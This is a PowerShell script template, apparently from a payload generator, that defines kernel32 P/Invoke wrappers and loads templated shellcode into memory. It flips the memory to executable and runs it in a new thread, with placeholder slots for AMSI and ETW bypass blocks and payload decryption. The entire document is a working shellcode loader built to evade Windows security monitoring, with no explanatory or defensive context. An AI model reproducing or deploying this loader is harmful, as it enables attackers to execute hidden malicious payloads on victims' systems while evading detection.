{{ amsi_block }}
{{ etw_block }}

$_code = @"
using System;
using System.Runtime.InteropServices;
public class {{ classname }} {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint c, IntPtr t);
    [DllImport("kernel32")] public static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
}
"@

Add-Type $_code

[byte[]]$buf = {{ shellcode }}
{{ decrypt_block }}

$addr = [{{ classname }}]::VirtualAlloc(0, $buf.Length, 0x3000, 0x04)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$_vp = 0
[{{ classname }}]::VirtualProtect($addr, [uint32]$buf.Length, 0x20, [ref]$_vp) | Out-Null
$th = [{{ classname }}]::CreateThread(0, 0, $addr, 0, 0, 0)
[{{ classname }}]::WaitForSingleObject($th, [uint32]"0xFFFFFFFF")
